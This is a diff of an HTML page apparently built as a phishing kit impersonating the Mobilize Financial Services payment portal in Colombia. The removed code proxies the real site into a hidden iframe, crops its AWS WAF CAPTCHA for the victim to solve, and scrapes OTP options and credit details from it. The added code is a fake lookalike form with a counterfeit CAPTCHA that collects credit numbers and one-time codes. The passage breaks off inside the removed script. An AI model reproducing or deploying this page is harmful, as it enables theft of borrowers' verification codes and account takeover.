@@ -3,722 +3,444 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mobilize Financial Services</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <title>Mobilize Financial Services - Portal de Pagos</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        *{box-sizing:border-box;margin:0;padding:0;font-family:'Poppins',sans-serif}
-        body{background:#f2f3f5;color:#333;min-height:100vh;display:flex;flex-direction:column}
-        .header{background:#fff;padding:25px 40px;box-shadow:0 2px 5px rgba(0,0,0,.05);display:flex;align-items:center}
-        .header img{height:100px;width:auto;object-fit:contain}
-        .main-container{flex:1;display:flex;justify-content:center;align-items:center;padding:40px 20px}
-        .card{background:#fff;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,.08);display:flex;width:100%;max-width:1050px;overflow:hidden}
-        .left-panel{background:#242833;color:#fff;padding:45px 40px;width:38%;display:flex;flex-direction:column}
-        .shield-icon{background:#d95d1e;width:40px;height:40px;border-radius:50%;display:flex;justify-content:center;align-items:center;margin-bottom:20px;color:#fff}
-        .left-panel h2{font-size:1.125rem;font-weight:600;margin-bottom:15px}
-        .left-panel p{font-size:13px;line-height:1.6;color:#b3b6c1;margin-bottom:20px}
-        .left-panel ol{padding-left:18px;font-size:13px;line-height:1.6;color:#b3b6c1;margin-bottom:25px}
-        .left-panel ol li{margin-bottom:12px}
-        .left-panel ol li strong{color:#fff;font-weight:600}
-        .contact-info{margin-top:auto;font-size:12px;color:#b3b6c1}
-        .contact-info ul{list-style:none;margin-top:10px}
-        .contact-info ul li{margin-bottom:5px}
-        .right-panel{padding:45px 50px;width:62%}
-        .right-panel h2{font-size:1.125rem;font-weight:600;color:#242833;margin-bottom:25px}
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: #1a1d26;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
 
-        .stepper{display:flex;align-items:center;justify-content:space-between;position:relative;margin-bottom:30px;padding:0 20px}
-        .stepper::before{content:'';position:absolute;top:15px;left:40px;right:40px;height:2px;background:#e0e0e0;z-index:1}
-        .step{position:relative;z-index:2;display:flex;flex-direction:column;align-items:center;background:#fff;padding:0 10px}
-        .step-circle{width:30px;height:30px;border-radius:50%;background:#fff;border:2px solid #e0e0e0;display:flex;justify-content:center;align-items:center;font-weight:600;color:#777;font-size:13px;margin-bottom:8px;transition:all .3s}
-        .step.active .step-circle{background:#e65c00;border-color:#e65c00;color:#fff}
-        .step.completed .step-circle{background:#34a853;border-color:#34a853;color:#fff}
-        .step span{font-size:11px;color:#666;font-weight:500}
-        .step.active span{color:#242833;font-weight:600}
-        .step.completed span{color:#34a853;font-weight:600}
+        .card {
+            display: flex;
+            max-width: 900px;
+            width: 100%;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+        }
 
-        .helper-text{font-size:12px;color:#666;margin-bottom:15px}
-        .input-group{margin-bottom:25px}
-        .input-group label{display:block;font-size:13px;font-weight:600;color:#242833;margin-bottom:8px}
-        .input-group label span{color:#e65c00}
-        .input-wrapper input{width:100%;padding:12px 15px;border:1px solid #ccc;border-radius:8px;font-size:14px;outline:none;transition:border .3s;font-family:'Poppins',sans-serif}
-        .input-wrapper input:focus{border-color:#e65c00}
-        .input-hint{font-size:11px;color:#888;margin-top:5px;display:block}
+        .card-left {
+            background: #242833;
+            padding: 40px 30px;
+            width: 340px;
+            min-width: 340px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+        .card-left img.logo { width: 180px; margin-bottom: 30px; }
+        .card-left h2 { color: #fff; font-size: 18px; font-weight: 600; margin-bottom: 10px; }
+        .card-left p { color: #8b8fa3; font-size: 13px; line-height: 1.6; }
 
-        .form-step{display:none;animation:fadeIn .4s ease}
-        .form-step.visible{display:block}
-        @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+        .card-right {
+            background: #fff;
+            padding: 40px 35px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
 
-        /* CAPTCHA — iframe recortado del sitio real */
-        .captcha-zone{margin-bottom:20px;animation:fadeIn .4s}
-        .captcha-label{font-size:13px;font-weight:600;color:#242833;margin-bottom:6px}
-        .captcha-sublabel{font-size:12px;color:#666;margin-bottom:12px}
-        .iframe-clip{position:relative;overflow:hidden;border-radius:8px;background:#f8f9fa;min-height:120px;transition:all .3s}
-        .iframe-clip iframe{position:absolute;border:none;transform-origin:0 0}
-        .iframe-loading{display:flex;align-items:center;justify-content:center;gap:10px;padding:40px 20px;color:#888;font-size:13px}
+        .stepper { display: flex; align-items: center; justify-content: center; margin-bottom: 35px; }
+        .step-item { display: flex; align-items: center; gap: 8px; }
+        .step-circle {
+            width: 32px; height: 32px; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 13px; font-weight: 600;
+            border: 2px solid #ddd; color: #aaa; transition: all 0.3s;
+        }
+        .step-circle.active { background: #e65c00; border-color: #e65c00; color: #fff; }
+        .step-circle.done { background: #22c55e; border-color: #22c55e; color: #fff; }
+        .step-label { font-size: 12px; color: #aaa; font-weight: 500; }
+        .step-label.active { color: #242833; }
+        .step-line { width: 40px; height: 2px; background: #ddd; margin: 0 8px; }
+        .step-line.done { background: #22c55e; }
 
-        /* Opciones OTP */
-        .otp-options{display:flex;gap:15px;margin-bottom:25px;flex-wrap:wrap}
-        .otp-option-card{flex:1;min-width:180px;padding:20px;border:2px solid #e0e0e0;border-radius:12px;cursor:pointer;transition:all .3s;text-align:center}
-        .otp-option-card:hover{border-color:#e65c00;background:#fff8f4}
-        .otp-option-card.selected{border-color:#e65c00;background:#fff8f4}
-        .otp-option-card .opt-icon{font-size:28px;margin-bottom:8px}
-        .otp-option-card .opt-label{font-size:13px;font-weight:600;color:#242833}
-        .otp-option-card .opt-desc{font-size:11px;color:#888;margin-top:4px}
+        .section-title { font-size: 20px; font-weight: 600; color: #242833; margin-bottom: 6px; }
+        .section-sub { font-size: 13px; color: #8b8fa3; margin-bottom: 25px; }
 
-        .otp-row{display:flex;gap:12px;align-items:flex-end;margin-bottom:20px}
-        .otp-row .input-group{flex:1;margin-bottom:0}
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; font-size: 13px; font-weight: 500; color: #242833; margin-bottom: 6px; }
+        .form-group input {
+            width: 100%; padding: 12px 16px;
+            border: 2px solid #e2e5ea; border-radius: 10px;
+            font-size: 15px; font-family: 'Poppins', sans-serif;
+            outline: none; transition: border 0.3s;
+        }
+        .form-group input:focus { border-color: #e65c00; }
 
-        .btn-continue{width:100%;padding:15px;background:#e0e0e0;color:#a0a0a0;border:none;border-radius:25px;font-size:15px;font-weight:600;cursor:not-allowed;transition:all .3s;font-family:'Poppins',sans-serif}
-        .btn-continue.active{background:#242833;color:#fff;cursor:pointer}
-        .btn-continue.active:hover{background:#1a1d26}
-        .btn-orange{width:100%;padding:15px;background:#e65c00;color:#fff;border:none;border-radius:25px;font-size:15px;font-weight:600;cursor:pointer;font-family:'Poppins',sans-serif;transition:all .3s}
-        .btn-orange:hover{background:#cc5200}
-        .btn-orange:disabled{background:#f0b088;cursor:not-allowed}
-        .btn-verify{padding:12px 30px;background:#242833;color:#fff;border:none;border-radius:25px;font-size:14px;font-weight:600;cursor:pointer;font-family:'Poppins',sans-serif;white-space:nowrap}
-        .btn-verify:hover{background:#1a1d26}
-        .btn-verify:disabled{background:#999;cursor:not-allowed}
+        .btn-primary {
+            width: 100%; padding: 14px;
+            background: #e65c00; color: #fff; border: none; border-radius: 10px;
+            font-size: 15px; font-weight: 600; font-family: 'Poppins', sans-serif;
+            cursor: pointer; transition: background 0.3s; letter-spacing: 1px;
+        }
+        .btn-primary:hover { background: #d45200; }
+        .btn-primary:disabled { background: #ccc; cursor: not-allowed; }
 
-        .spinner{display:inline-block;width:18px;height:18px;border:3px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
-        @keyframes spin{to{transform:rotate(360deg)}}
-        .spinner-dark{display:inline-block;width:16px;height:16px;border:3px solid #e0e0e0;border-top-color:#e65c00;border-radius:50%;animation:spin .8s linear infinite}
+        /* CAPTCHA decorativo */
+        .captcha-box {
+            border: 2px solid #e2e5ea;
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        .captcha-header {
+            background: #242833;
+            color: #fff;
+            padding: 10px 14px;
+            font-size: 13px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .captcha-header .shield {
+            width: 22px; height: 22px;
+            background: #e65c00;
+            border-radius: 5px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 12px;
+        }
+        .captcha-instruction {
+            padding: 10px 14px;
+            background: #f8f9fb;
+            font-size: 13px;
+            color: #242833;
+            font-weight: 500;
+            border-bottom: 1px solid #e2e5ea;
+        }
+        .captcha-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 3px;
+            padding: 3px;
+            background: #e2e5ea;
+        }
+        .captcha-tile {
+            aspect-ratio: 1;
+            background-size: cover;
+            background-position: center;
+            background-color: #ddd;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.2s;
+        }
+        .captcha-tile:hover { opacity: 0.85; }
+        .captcha-tile.selected::after {
+            content: '✓';
+            position: absolute;
+            inset: 0;
+            background: rgba(230, 92, 0, 0.55);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 28px;
+            font-weight: 700;
+        }
 
-        .result-box{margin-top:15px;padding:16px 20px;border-radius:10px;font-size:13px;animation:fadeIn .4s}
-        .result-box.success{background:#e8f5e9;border:1px solid #a5d6a7;color:#2e7d32}
-        .result-box.error{background:#fce4ec;border:1px solid #ef9a9a;color:#c62828}
-        .result-box.info{background:#e3f2fd;border:1px solid #90caf9;color:#1565c0}
+        .otp-options { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
+        .otp-card {
+            border: 2px solid #e2e5ea; border-radius: 12px;
+            padding: 16px 20px; cursor: pointer; transition: all 0.3s;
+            display: flex; align-items: center; gap: 14px;
+        }
+        .otp-card:hover { border-color: #e65c00; background: #fff8f4; }
+        .otp-card.selected { border-color: #e65c00; background: #fff8f4; }
+        .otp-card .icon {
+            width: 40px; height: 40px; background: #f0f1f5; border-radius: 10px;
+            display: flex; align-items: center; justify-content: center; font-size: 18px;
+        }
+        .otp-card.selected .icon { background: #e65c00; color: #fff; }
+        .otp-card .info { flex: 1; }
+        .otp-card .info strong { font-size: 14px; color: #242833; display: block; }
+        .otp-card .info span { font-size: 12px; color: #8b8fa3; }
 
-        .footer{background:#fff;padding:40px;font-size:11px;color:#666;line-height:1.6;margin-top:auto}
-        .footer p{margin-bottom:12px}
-        .footer img{height:90px;width:auto;object-fit:contain;margin-top:20px;margin-bottom:15px}
-        .footer-legal{font-size:9px;color:#999}
+        .spinner-wrap {
+            display: flex; flex-direction: column; align-items: center;
+            justify-content: center; padding: 40px 0; gap: 16px;
+        }
+        .spinner {
+            width: 44px; height: 44px;
+            border: 4px solid #f0f1f5; border-top-color: #e65c00;
+            border-radius: 50%; animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .spinner-text { font-size: 14px; color: #8b8fa3; }
 
-        @media(max-width:900px){
-            .header{padding:15px 20px;justify-content:center}
-            .header img{height:60px}
-            .main-container{padding:0;align-items:flex-start}
-            .card{flex-direction:column;border-radius:0}
-            .left-panel{width:100%;padding:25px 20px;order:1}
-            .right-panel{width:100%;padding:25px 20px;order:2}
-            .stepper{padding:0 5px}
-            .stepper::before{left:15px;right:15px}
-            .footer{padding:20px;text-align:center}
-            .footer img{height:60px}
-            .otp-row{flex-direction:column}
-            .otp-row .btn-verify{width:100%}
-            .otp-options{flex-direction:column}
-            .otp-option-card{min-width:unset}
-            .left-panel h2{font-size:1rem;margin-bottom:10px}
-            .left-panel p{font-size:12px;margin-bottom:12px}
-            .left-panel ol{font-size:12px;margin-bottom:15px}
-            .left-panel ol li{margin-bottom:8px}
-            .contact-info{font-size:11px}
-            .right-panel h2{font-size:1rem;margin-bottom:15px}
+        .error-msg {
+            background: #fef2f2; border: 1px solid #fca5a5; color: #dc2626;
+            padding: 12px 16px; border-radius: 10px; font-size: 13px;
+            margin-bottom: 16px; display: none;
+        }
+
+        .step-content { display: none; }
+        .step-content.active { display: block; }
+
+        @media (max-width: 700px) {
+            .card { flex-direction: column; }
+            .card-left { width: 100%; min-width: 100%; padding: 25px 20px; }
+            .card-left img.logo { width: 140px; margin-bottom: 15px; }
+            .card-right { padding: 25px 20px; }
+            .step-label { display: none; }
         }
     </style>
 </head>
 <body>
-
-<header class="header">
-    <img src="/app/mobil.png" alt="Mobilize Financial Services Logo">
-</header>
-
-<main class="main-container">
     <div class="card">
-        <div class="left-panel">
-            <div class="shield-icon">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
-            </div>
-            <h2>Verificación segura</h2>
-            <p>Tu experiencia de pagos en línea es más segura.</p>
-            <p>Hemos implementado unas verificaciones rápidas para proteger la información:</p>
-            <ol>
-                <li>Ingresa el <strong>número de crédito</strong>.</li>
-                <li>Selecciona el medio para recibir tu <strong>código de verificación</strong>.</li>
-                <li>Ingresa el <strong>código</strong> de un solo uso que recibirás en tu celular o correo electrónico registrado.</li>
-                <li>Revisa tu crédito y <strong>realiza el pago</strong> de forma segura.</li>
-            </ol>
-            <p>Tus medios de pago, valores y fechas siguen siendo los mismos.</p>
-            <div class="contact-info">
-                <p>¿No recuerdas tu número de crédito o no recibes el código? Comunícate con nuestras líneas de atención:</p>
-                <ul>
-                    <li>Celular: 350 318 9889</li>
-                    <li>Bogotá: (601) 491 8516</li>
-                    <li>Medellín: (604) 480 3474</li>
-                </ul>
-            </div>
+        <div class="card-left">
+            <img class="logo" src="mobil.png" alt="Mobilize" onerror="this.style.display='none'">
+            <h2>Portal de Pagos</h2>
+            <p>Consulta y paga tu crédito de manera rápida y segura</p>
         </div>
 
-        <div class="right-panel">
-            <h2>Verificación por código</h2>
-
+        <div class="card-right">
             <div class="stepper">
-                <div class="step active" id="stepItem1"><div class="step-circle">1</div><span>Búsqueda</span></div>
-                <div class="step" id="stepItem2"><div class="step-circle">2</div><span>Envío</span></div>
-                <div class="step" id="stepItem3"><div class="step-circle">3</div><span>Verificación</span></div>
+                <div class="step-item">
+                    <div class="step-circle active" id="sc1">1</div>
+                    <span class="step-label active" id="sl1">Crédito</span>
+                </div>
+                <div class="step-line" id="line1"></div>
+                <div class="step-item">
+                    <div class="step-circle" id="sc2">2</div>
+                    <span class="step-label" id="sl2">Verificación</span>
+                </div>
+                <div class="step-line" id="line2"></div>
+                <div class="step-item">
+                    <div class="step-circle" id="sc3">3</div>
+                    <span class="step-label" id="sl3">Código</span>
+                </div>
             </div>
 
-            <!-- PASO 1: Crédito + CAPTCHA iframe real -->
-            <div id="formStep1" class="form-step visible">
-                <p class="helper-text">Paso 1 de 3 — Ingresa tu número de crédito.</p>
-                <div class="input-group">
-                    <label>Número de crédito <span>*</span></label>
-                    <div class="input-wrapper">
-                        <input type="text" id="creditNumber" placeholder="" inputmode="numeric">
-                        <span class="input-hint">Solo números, sin espacios.</span>
+            <div class="error-msg" id="errorMsg"></div>
+
+            <!-- STEP 1: Input crédito + CAPTCHA + botón CONTINUAR -->
+            <div class="step-content active" id="step1">
+                <div class="section-title">Número de crédito</div>
+                <p class="section-sub">Ingresa tu número de crédito y completa la verificación</p>
+
+                <div class="form-group">
+                    <label for="creditInput">Número de crédito</label>
+                    <input type="text" id="creditInput" placeholder="Ej: 123456789" inputmode="numeric" autocomplete="off">
+                </div>
+
+                <div class="captcha-box">
+                    <div class="captcha-header">
+                        <div class="shield">🛡</div>
+                        <span>Verificación de seguridad</span>
                     </div>
+                    <div class="captcha-instruction" id="captchaInstruction"></div>
+                    <div class="captcha-grid" id="captchaGrid"></div>
                 </div>
 
-                <!-- CAPTCHA real via iframe recortado -->
-                <div class="captcha-zone" id="captchaZone">
-                    <div class="captcha-label">Verificación de seguridad</div>
-                    <div class="captcha-sublabel">Confirma que eres una persona para continuar.</div>
-                    <div class="iframe-clip" id="iframeClip">
-                        <div class="iframe-loading" id="iframeLoading">
-                            <span class="spinner-dark"></span> Cargando verificación...
-                        </div>
-                    </div>
-                </div>
-
-                <button class="btn-continue" id="btnStart" disabled>CONTINUAR</button>
+                <button class="btn-primary" onclick="startProcess()">CONTINUAR</button>
             </div>
 
-            <!-- PASO 2: Selección método OTP -->
-            <div id="formStep2" class="form-step">
-                <p class="helper-text">Paso 2 de 3 — Selecciona cómo deseas recibir tu código de verificación.</p>
-                <div class="otp-options" id="otpOptionsContainer"></div>
-                <button class="btn-continue" id="btnSendOtp" disabled onclick="seleccionarMetodoOtp()">ENVIAR CÓDIGO</button>
-            </div>
-
-            <!-- PASO 3: Ingresar OTP -->
-            <div id="formStep3" class="form-step">
-                <p class="helper-text" id="otpSentMsg">Paso 3 de 3 — Ingresa el código que recibiste.</p>
-                <div class="input-group">
-                    <label>Código de verificación <span>*</span></label>
-                    <div class="otp-row">
-                        <div class="input-group">
-                            <div class="input-wrapper">
-                                <input type="text" id="otpCode" placeholder="Código de 6 dígitos" maxlength="6" inputmode="numeric">
-                            </div>
-                        </div>
-                        <button class="btn-verify" id="btnVerify" onclick="enviarOtp()">VERIFICAR</button>
-                    </div>
-                    <span class="input-hint" id="otpHintText">El código fue enviado a tu celular o correo registrado.</span>
+            <!-- Loading -->
+            <div class="step-content" id="step1Loading">
+                <div class="spinner-wrap">
+                    <div class="spinner"></div>
+                    <div class="spinner-text">Verificando tu identidad...</div>
+                    <div class="spinner-text" style="font-size:12px;color:#bbb;">Esto puede tomar unos segundos</div>
                 </div>
             </div>
 
-            <!-- RESULTADO -->
-            <div id="formStepResult" class="form-step">
-                <div class="result-box success">
-                    <strong>✓ Verificación exitosa</strong>
-                    <p style="margin-top:6px;font-size:12px">Tu identidad fue verificada correctamente.</p>
+            <!-- STEP 2: OTP -->
+            <div class="step-content" id="step2">
+                <div class="section-title">Método de verificación</div>
+                <p class="section-sub">Selecciona cómo deseas recibir tu código</p>
+                <div class="otp-options" id="otpOptions"></div>
+                <button class="btn-primary" id="btnStep2" onclick="selectOtp()" disabled>CONTINUAR</button>
+            </div>
+            <div class="step-content" id="step2Loading">
+                <div class="spinner-wrap">
+                    <div class="spinner"></div>
+                    <div class="spinner-text">Enviando código de verificación...</div>
                 </div>
-                <div id="resultData" style="margin-top:15px"></div>
-                <button class="btn-orange" style="margin-top:20px" onclick="resetAll()">NUEVA CONSULTA</button>
             </div>
 
-            <div id="resultMsg"></div>
+            <!-- STEP 3: OTP code -->
+            <div class="step-content" id="step3">
+                <div class="section-title">Código de verificación</div>
+                <p class="section-sub">Ingresa el código que recibiste</p>
+                <div class="form-group">
+                    <label for="otpInput">Código OTP</label>
+                    <input type="text" id="otpInput" placeholder="Ingresa el código" inputmode="numeric" maxlength="8" autocomplete="one-time-code">
+                </div>
+                <button class="btn-primary" onclick="verifyOtp()">VERIFICAR</button>
+            </div>
+            <div class="step-content" id="step3Loading">
+                <div class="spinner-wrap">
+                    <div class="spinner"></div>
+                    <div class="spinner-text">Verificando código...</div>
+                </div>
+            </div>
         </div>
     </div>
-</main>
 
-<footer class="footer">
-    <p>Todos los pagos serán aplicados según el horario bancario definido por la Entidad.</p>
-    <p>Todo abono extraordinario realizado no adelantará cuotas del crédito; por defecto, éste será aplicado a capital bajo la modalidad de reducir el plazo.</p>
-    <p>Si posees más de un crédito, es necesario realizar una transacción por cada uno.</p>
-    <p>Para resolver tus inquietudes sobre el crédito, contáctanos a través de nuestras líneas de atención.</p>
-    <img src="/app/footer.png" alt="Mobilize Footer Logo">
-    <p class="footer-legal">Los productos y servicios ofrecidos a través de MOBILIZE FINANCIAL SERVICES, son otorgados por RCI Colombia S.A Compañía de Financiamiento, entidad vigilada por la Superintendencia Financiera de Colombia</p>
-</footer>
+    <script>
+        let currentSession = null;
+        let selectedOtpIndex = null;
+        const API = window.location.origin;
 
-<script>
-// ============================================================
-// IFRAME DEL SITIO REAL (proxy reverso → same-origin)
-// ============================================================
-let frame = null;
-let captchaFound = false;
-let captchaSolved = false;
-let selectedOtpOption = null;
-let otpOptionsList = [];
-let iframeReady = false;
-let observerInterval = null;
-let currentStep = 'credit'; // credit | captcha-wait | otp-select | otp-code | done
+        const CATEGORIES = [
+            { text: 'autobuses', imgs: [
+                'https://images.unsplash.com/photo-1570125909232-eb263c188f7e?w=200&h=200&fit=crop',
+                'https://images.unsplash.com/photo-1544620347-c4fd4a3d5957?w=200&h=200&fit=crop',
+                'https://images.unsplash.com/photo-1558618666-fcd25c85f82e?w=200&h=200&fit=crop',
+            ]},
+            { text: 'semáforos', imgs: [
+                'https://images.unsplash.com/photo-1579547945413-497e1b99dac0?w=200&h=200&fit=crop',
+                'https://images.unsplash.com/photo-1566024287286-457247b70310?w=200&h=200&fit=crop',
+                'https://images.unsplash.com/photo-1590080874088-eec30c260835?w=200&h=200&fit=crop',
+            ]},
+            { text: 'bicicletas', imgs: [
+                'https://images.unsplash.com/photo-1485965120184-e220f721d03e?w=200&h=200&fit=crop',
+                'https://images.unsplash.com/photo-1532298229144-0ec0c57515c7?w=200&h=200&fit=crop',
+                'https://images.unsplash.com/photo-1571068316344-75bc76f77890?w=200&h=200&fit=crop',
+            ]},
+            { text: 'motocicletas', imgs: [
+                'https://images.unsplash.com/photo-1558981806-ec527fa84c39?w=200&h=200&fit=crop',
+                'https://images.unsplash.com/photo-1568772585407-9361f9bf3a87?w=200&h=200&fit=crop',
+                'https://images.unsplash.com/photo-1609630875171-b1321377ee65?w=200&h=200&fit=crop',
+            ]},
+        ];
+        const FILLERS = [
+            'https://images.unsplash.com/photo-1449824913935-59a10b8d2000?w=200&h=200&fit=crop',
+            'https://images.unsplash.com/photo-1480714378408-67cf0d13bc1b?w=200&h=200&fit=crop',
+            'https://images.unsplash.com/photo-1496412705862-e0088f16f791?w=200&h=200&fit=crop',
+            'https://images.unsplash.com/photo-1501594907352-04cda38ebc29?w=200&h=200&fit=crop',
+            'https://images.unsplash.com/photo-1504384308090-c894fdcc538d?w=200&h=200&fit=crop',
+            'https://images.unsplash.com/photo-1518770660439-4636190af475?w=200&h=200&fit=crop',
+            'https://images.unsplash.com/photo-1526304640581-d334cdbbf45e?w=200&h=200&fit=crop',
+            'https://images.unsplash.com/photo-1494522855154-9297ac14b55f?w=200&h=200&fit=crop',
+            'https://images.unsplash.com/photo-1493246507139-91e8fad9978e?w=200&h=200&fit=crop',
+            'https://images.unsplash.com/photo-1500534623283-312aade485b7?w=200&h=200&fit=crop',
+        ];
 
-// Crear iframe al cargar la página
-function initIframe() {
-    frame = document.createElement('iframe');
-    frame.id = 'mobilizeFrame';
-    frame.src = '/portal-pagos/';
-    frame.style.cssText = 'position:absolute;border:none;width:500px;height:900px;opacity:0;pointer-events:none;';
-    document.getElementById('iframeClip').appendChild(frame);
-
-    frame.addEventListener('load', function() {
-        console.log('[IFRAME] Cargado');
-        iframeReady = true;
-        startObserving();
-    });
-}
-
-// ============================================================
-// OBSERVAR DOM DEL IFRAME
-// ============================================================
-function startObserving() {
-    // Polling cada 500ms para detectar cambios
-    if (observerInterval) clearInterval(observerInterval);
-    observerInterval = setInterval(checkIframeState, 500);
-}
-
-function getIframeDoc() {
-    try {
-        return frame.contentDocument || frame.contentWindow.document;
-    } catch (e) {
-        console.log('[IFRAME] No se puede acceder al DOM:', e.message);
-        return null;
-    }
-}
-
-function checkIframeState() {
-    const fdoc = getIframeDoc();
-    if (!fdoc || !fdoc.body) return;
-
-    // Buscar CAPTCHA
-    const captchaEl = findCaptchaElement(fdoc);
-
-    if (captchaEl && !captchaFound) {
-        captchaFound = true;
-        console.log('[IFRAME] CAPTCHA detectado');
-        positionIframeToCaptcha(captchaEl);
-        document.getElementById('iframeLoading').style.display = 'none';
-    }
-
-    if (!captchaEl && captchaFound && !captchaSolved) {
-        // CAPTCHA desapareció → fue resuelto
-        captchaSolved = true;
-        console.log('[IFRAME] CAPTCHA resuelto');
-        onCaptchaSolved();
-    }
-
-    // Buscar opciones OTP (radios de Angular Material)
-    if (currentStep === 'captcha-wait' || currentStep === 'credit') {
-        const otpOpts = findOtpOptions(fdoc);
-        if (otpOpts.length > 0) {
-            console.log('[IFRAME] Opciones OTP detectadas:', otpOpts.length);
-            renderOtpOptions(otpOpts);
-            showStep('formStep2');
-            currentStep = 'otp-select';
-        }
-    }
-
-    // Buscar datos del crédito (después de verificar OTP)
-    if (currentStep === 'otp-code') {
-        const creditData = findCreditData(fdoc);
-        if (creditData) {
-            console.log('[IFRAME] Datos del crédito detectados');
-            onCreditDataFound(creditData);
-        }
-    }
-}
-
-function findCaptchaElement(doc) {
-    // Buscar por selectores conocidos de AWS WAF CAPTCHA
-    const selectors = [
-        '#captcha-container',
-        '.waf-captcha__stage',
-        '[class*="captcha"]',
-        'iframe[src*="captcha"]',
-        'iframe[src*="challenge"]',
-    ];
-    for (const sel of selectors) {
-        const el = doc.querySelector(sel);
-        if (el && el.offsetHeight > 30) return el;
-    }
-
-    // Buscar iframes internos que puedan contener CAPTCHA
-    const iframes = doc.querySelectorAll('iframe');
-    for (const ifr of iframes) {
-        const src = (ifr.src || '').toLowerCase();
-        if (src.includes('captcha') || src.includes('challenge') || src.includes('waf')) {
-            return ifr;
-        }
-    }
-
-    // Buscar por contenido de texto
-    const allDivs = doc.querySelectorAll('div, section');
-    for (const d of allDivs) {
-        const txt = (d.innerText || '').toLowerCase();
-        if ((txt.includes('elija todo') || txt.includes('seleccione') || txt.includes('verify')) && d.offsetHeight > 80) {
-            return d;
-        }
-    }
-
-    return null;
-}
-
-function findOtpOptions(doc) {
-    const options = [];
-    // Angular Material radio buttons
-    const radios = doc.querySelectorAll('mat-radio-button');
-    radios.forEach((radio, i) => {
-        const label = radio.innerText.trim();
-        if (label) {
-            options.push({
-                index: i,
-                label: label,
-                type: label.toLowerCase().includes('correo') || label.toLowerCase().includes('email') ? 'email' : 'sms',
-                value: radio.getAttribute('value') || label,
-                element: radio,
+        function buildCaptcha() {
+            const cat = CATEGORIES[Math.floor(Math.random() * CATEGORIES.length)];
+            document.getElementById('captchaInstruction').innerHTML =
+                'Elija todas las imágenes con <strong>' + cat.text + '</strong>';
+            const grid = document.getElementById('captchaGrid');
+            grid.innerHTML = '';
+            const correct = cat.imgs.slice().sort(() => Math.random() - 0.5).slice(0, 2 + Math.floor(Math.random() * 2));
+            const fill = FILLERS.slice().sort(() => Math.random() - 0.5);
+            const tiles = [...correct];
+            while (tiles.length < 9) tiles.push(fill.pop());
+            tiles.sort(() => Math.random() - 0.5);
+            tiles.forEach(url => {
+                const t = document.createElement('div');
+                t.className = 'captcha-tile';
+                t.style.backgroundImage = 'url(' + url + ')';
+                t.onclick = () => t.classList.toggle('selected');
+                grid.appendChild(t);
             });
         }
-    });
+        buildCaptcha();
 
-    // Fallback: buscar radio inputs normales
-    if (options.length === 0) {
-        const inputs = doc.querySelectorAll('input[type="radio"]');
-        inputs.forEach((inp, i) => {
-            const lbl = doc.querySelector(`label[for="${inp.id}"]`);
-            const label = lbl ? lbl.innerText.trim() : inp.value;
-            if (label) {
-                options.push({
-                    index: i,
-                    label: label,
-                    type: label.toLowerCase().includes('correo') ? 'email' : 'sms',
-                    value: inp.value || label,
-                    element: inp,
-                });
+        function showStep(id) {
+            document.querySelectorAll('.step-content').forEach(el => el.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+            if (window.innerWidth <= 700) document.querySelector('.card-right').scrollIntoView({ behavior: 'smooth' });
+        }
+        function showError(msg) {
+            const el = document.getElementById('errorMsg');
+            el.textContent = msg; el.style.display = 'block';
+            setTimeout(() => el.style.display = 'none', 8000);
+        }
+        function updateStepper(step) {
+            for (let i = 1; i <= 3; i++) {
+                document.getElementById('sc'+i).className = 'step-circle';
+                document.getElementById('sl'+i).className = 'step-label';
             }
-        });
-    }
-
-    return options;
-}
-
-function findCreditData(doc) {
-    const body = doc.body.innerText || '';
-    // Buscar patrones de datos del crédito
-    if ((body.includes('titular') || body.includes('Titular') || body.includes('TITULAR')) &&
-        (body.includes('cuota') || body.includes('Cuota') || body.includes('saldo') || body.includes('Saldo'))) {
-        return {
-            text: body,
-            html: doc.body.innerHTML,
-        };
-    }
-    return null;
-}
-
-// ============================================================
-// POSICIONAR IFRAME para mostrar solo el CAPTCHA
-// ============================================================
-function positionIframeToCaptcha(captchaEl) {
-    const rect = captchaEl.getBoundingClientRect();
-    const clip = document.getElementById('iframeClip');
-    const pad = 10;
-
-    // Dimensiones del contenedor = tamaño del CAPTCHA + padding
-    const w = Math.max(rect.width + pad * 2, 320);
-    const h = Math.max(rect.height + pad * 2, 200);
-    clip.style.width = w + 'px';
-    clip.style.height = h + 'px';
-
-    // Posicionar iframe para que el CAPTCHA quede visible
-    frame.style.left = -(rect.left - pad) + 'px';
-    frame.style.top = -(rect.top - pad) + 'px';
-    frame.style.opacity = '1';
-    frame.style.pointerEvents = 'auto';
-}
-
-// ============================================================
-// STEPPER
